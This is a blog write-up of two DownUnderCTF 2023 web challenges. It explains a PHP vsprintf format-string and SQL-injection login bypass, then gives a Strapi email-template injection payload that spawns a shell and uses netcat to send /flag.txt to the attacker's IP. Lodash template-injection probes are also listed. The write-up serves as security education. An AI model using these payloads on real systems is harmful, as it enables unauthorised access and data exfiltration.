---
title: What I learned from - downunderctf 2023- Web Section 
date: 2023-09-03 18:25:56
cover_image: https://api.2h0ng.wiki:443/noteimages/2023/09/02/image-20230902190236092.png
cover_image_alt: About Comments
categories: Writeup
tags:
  - ctf 
  - downunderctf
---

# Smooth Jazz

## Source Code

```php
<?php
function mysql_fquery($mysqli, $query, $params) {
  return mysqli_query($mysqli, vsprintf($query, $params));
}

if (isset($_POST['username']) && isset($_POST['password'])) {
  $mysqli = mysqli_connect('db', 'challuser', 'challpass', 'challenge');
  $username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
  $password = sha1($_POST['password']);

  $res = mysql_fquery($mysqli, 'SELECT * FROM users WHERE username = "%s"', [$username]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Username not found.";
     goto fail;
  }
  $res = mysql_fquery($mysqli, 'SELECT * FROM users WHERE username = "'.$username.'" AND password = "%s"', [$password]);
  if (!mysqli_fetch_assoc($res)) {
     $message = "Invalid password.";
     goto fail;
  }
  $htmlsafe_username = htmlspecialchars($username, ENT_COMPAT | ENT_SUBSTITUTE);
  $greeting = $username === "admin" 
      ? "Hello $htmlsafe_username, the server time is %s and the flag is %s"
      : "Hello $htmlsafe_username, the server time is %s";

  $message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
  
  fail:
}
?>
```



## Prerequisite knowledge

- Mysql engine **truncates** string from the beginning of an invalid UTF8-encoding character.

- Familiarity with the **format** parameter and the behavior of the **vsprintf** function in PHP.

  - `vsprintf(string $format, mixed ...$values): string`

    - **Format parameter**: 

      - `%[argnum$][flags][width][.precision][specifier]`

        - Example: `%1$'as`

          > **%**: starting symbol
          >
          > **1$**: [argnums$] :match the first value from values that are passed in.
          >
          > **'a**: one option of the [flags] -> '(char): Replace blank with 'a' to pad the result string. For example, when [width] is set to 100 and the real length of the formatting string is only 5, the rest of the 95 characters would be padded with the letter 'a'.
          >
          > **s**: [specifier]: specify the data type for each data from inputted values. `%` is also a specifier, used for output real `%`, which is a tricky one for <u>smuggling</u> a new token by combining it with the **htmlspecialchars** function.

## Payload

```
POST /

username=admin%ff%251$c%23+%251$'>%25s&password=668
```

- **%ff**: truncates string after "admin". From the Mysql engine's perspective, <u>all the input characters are already determined as "admin"</u>.

- **%251$c** (URL DECODING)-> **%1$c**: a positional specifier tricks the sprints function to format string as we want. In other words, it controls the real transfer stream and achieves our expectations by combining with the password value.

  why we can't directly use %c to format the password field is that formatting a string usually works in order, rendering each item of an input array perspectively to each place of specifier. So we need to specify which data to render, avoiding the error.

  > PHP Fatal error:  Uncaught ValueError: The arguments array must contain 2 items, 1 given in /var/www/html/index.php:3\nStack trace:\n#0 /var/www/html/index.php(3): vsprintf()

- **password=668**: cha1(668) = 34cXXXXX. %34 represents a url-encoded **double-quote**. vsprintf("%1$c", 34) will generate a double-quote to exploit SQL Injection, <u>bypassing the password authentication</u>. 

- **%251$'>%25s** (URL DECODING)-> **%1$'>%s**:  the last step to do is get flag. Although we can not make the username totally match "admin", we can inject a specifier as above to exfiltrate the second 'FLAG' formatting input. 

- To that end, there is a problem emerging. We can not pass two specifiers into the username field, since the previous vsprintf functions all only accept one input value. That means if we directly pass two specifiers in, it will cause a error from php interpreters as we discussed above. So the key point is to leverage `htmlspecialchars` function to "create a specifier" for us. That is what this payload did.

- %1$'>%s --htmlspecialchars-->  %1$'\&gt;%s

  -  The first specifier: **%1$'&g**: a floating point number, taking from position 1, using & as padding char
  - followed by the string "t;"
  - The second specifier: **%s**: string taken from the 2nd position, that is where the FLAG is.

- That is how we arrived there.

# Strapi In

STRAPI IN quick writeup : 

step 1: create a  custom template with a reference id 1

```
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","nc **YOUR_IP YOUR_PORT** < /flag.txt"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

step 2: visit the url: https://web-strapi-in-6a0f1abf2bf0cbc0.2023.ductf.dev/api/sendtestemail/1 

**for debug**

`/opt/strapi-in/node_modules/strapi-plugin-email-designer/server/services/email.js:91:87`

![image-20230902190236092](https://api.2h0ng.wiki:443/noteimages/2023/09/02/image-20230902190236092.png)

![image-20230902190324305](https://api.2h0ng.wiki:443/noteimages/2023/09/02/image-20230902190324305.png)

## mustache template with Lodash SSTI payloads

```
{{= _.VERSION }}
{{= _.templateSettings.evaluate }}

```

https://github.com/janl/mustache.js

## Reference

https://www.php.net/manual/en/function.sprintf.php#Specifiers

https://www.php.net/manual/en/function.htmlspecialchars.php

https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/web/smooth-jazz/solve/solution.py

https://www.geeksforgeeks.org/lodash-_-template-method/

https://twitter.com/rootxharsh/status/1268181937127997446?lang=en

https://www.ghostccamm.com/blog/multi_strapi_vulns/

https://lodash.com/docs/4.17.15#templateSettings